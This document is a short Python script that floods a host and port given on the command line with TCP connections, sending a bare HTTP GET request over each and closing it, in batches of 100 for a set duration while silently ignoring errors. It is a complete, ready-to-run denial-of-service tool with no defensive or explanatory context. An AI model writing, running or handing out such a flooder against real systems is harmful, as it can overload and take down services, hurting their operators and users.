import socket, sys, time
ip = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])

timeout = time.time() + duration
while time.time() < timeout:
    try:
        for _ in range(100):
            s = socket.socket()
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
            s.close()
    except:
        pass